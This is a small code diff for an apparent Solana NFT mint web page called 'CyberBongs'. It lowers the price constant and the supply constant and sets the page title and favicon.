@@ -6,10 +6,10 @@ import OwnLayout from "./OwnLayout/OwnLayout";
 import imgDiscord from './icons8-discord-50.png'
 import imgTwitter from './icons8-twitter-50.png'
 
-const solAmount = '2.5'
+const solAmount = '1.9'
 const image = 'https://media.discordapp.net/attachments/966662928541573120/1026239660680298547/IMG_1105.jpg?width=491&height=491'
 const Title = "CyberBongs"
-const supply = 5472
+const supply = 111
 
 document.title = Title
 document.getElementById('favicon').setAttribute('href', image)
